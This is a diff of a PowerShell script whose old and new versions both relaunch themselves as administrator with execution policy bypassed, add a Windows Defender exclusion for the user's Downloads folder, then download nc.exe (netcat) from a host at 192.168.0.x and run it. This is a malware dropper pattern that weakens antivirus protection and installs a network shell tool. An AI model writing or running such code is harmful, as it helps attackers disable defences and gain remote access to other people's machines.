@@ -1,37 +1,19 @@
-function Ensure-Elevated {
-    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
-    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
-    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        $script = $MyInvocation.MyCommand.Definition
-        $arguments = "-ExecutionPolicy Bypass -File `"$script`""
-        Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
-        exit
-    }
+# Check if script is running with Administrator privileges
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
+    [Security.Principal.WindowsBuiltinRole] "Administrator")) {
+
+    # Relaunch the script with admin privileges
+    $scriptPath = $MyInvocation.MyCommand.Definition
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
+    exit
 }
 
-function Ensure-WindowsPowerShell {
-    if ($PSVersionTable.PSEdition -ne 'Desktop') {
-        $script = $MyInvocation.MyCommand.Definition
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
-        exit
-    }
-}
+Add-MpPreference -ExclusivePath $env:USERPROFILE\Downloads
+$url = 'http://192.168.0.111/nc.exe'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'nc.exe')
 
-Ensure-Elevated
-Ensure-WindowsPowerShell
+Start-Sleep -Milliseconds 100
 
-try {
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
+Invoke-Webrequest -Uri $url -OutFile $outputFile
 
-    $url = 'http://192.168.0.114/nc.exe'
-    $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'nc.exe')
-
-    Start-Sleep -Milliseconds 100
-
-    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
-
-    Start-Process -FilePath $outputFile
-}
-catch {
-    Write-Error "Execution failed: $_"
-}
+Start-Process -FilePath $outputFile
